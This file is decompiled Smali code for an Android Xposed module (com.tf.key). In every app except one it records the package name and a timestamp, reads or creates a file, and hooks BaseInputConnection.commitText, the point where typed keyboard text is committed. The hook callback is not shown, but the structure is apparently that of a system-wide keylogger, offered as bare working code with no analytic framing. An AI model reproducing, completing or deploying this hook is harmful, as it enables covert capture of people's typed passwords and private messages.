.class public Lcom/tf/key/MainActivity;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Lde/robv/android/xposed/IXposedHookLoadPackage;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tf/key/MainActivity$100000000;
    }
.end annotation


# instance fields
.field public cal:Ljava/util/Calendar;

.field public ed:Landroid/widget/EditText;

.field public time:Ljava/util/Date;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 101
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public handleLoadPackage(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 15
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;",
            ")V^",
            "Ljava/lang/Throwable;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Throwable;
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 23
    move-object v0, p0

    move-object/from16 v1, p1

    move-object v4, v1

    iget-object v4, v4, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.fkzhang.qqxposed"

    invoke-virtual {v4, v5}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 40
    :goto_0
    return-void

    .line 28
    :cond_0
    move-object v4, v0

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v5

    iput-object v5, v4, Lcom/tf/key/MainActivity;->cal:Ljava/util/Calendar;

    .line 29
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/tf/key/MainActivity;->cal:Ljava/util/Calendar;

    invoke-virtual {v5}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v5

    iput-object v5, v4, Lcom/tf/key/MainActivity;->time:Ljava/util/Date;

    .line 31
    move-object v4, v1

    iget-object v4, v4, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lcom/tf/key/prop;->packname:Ljava/lang/String;

    .line 33
    :try_start_0
    invoke-static {}, Lcom/tf/key/file;->duqu()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v4

    .line 40
    :goto_1
    const-string v4, "android.view.inputmethod.BaseInputConnection"

    move-object v5, v1

    iget-object v5, v5, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v6, "commitText"

    const/4 v7, 0x3

    new-array v7, v7, [Ljava/lang/Object;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x0

    :try_start_1
    const-string v10, "java.lang.CharSequence"

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v10

    aput-object v10, v8, v9

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x1

    sget-object v10, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v10, v8, v9

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x2

    new-instance v10, Lcom/tf/key/MainActivity$100000000;

    move-object v14, v10

    move-object v10, v14

    move-object v11, v14

    move-object v12, v0

    move-object v13, v1

    invoke-direct {v11, v12, v13}, Lcom/tf/key/MainActivity$100000000;-><init>(Lcom/tf/key/MainActivity;Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    aput-object v10, v8, v9

    invoke-static {v4, v5, v6, v7}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    move-result-object v4

    goto :goto_0

    .line 33
    :catch_0
    move-exception v4

    move-object v2, v4

    .line 37
    invoke-static {}, Lcom/tf/key/file;->cfile()V

    goto :goto_1

    .line 40
    :catch_1
    move-exception v4

    move-object v2, v4

    new-instance v4, Ljava/lang/NoClassDefFoundError;

    move-object v14, v4

    move-object v4, v14

    move-object v5, v14

    move-object v6, v2

    invoke-virtual {v6}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v4
.end method
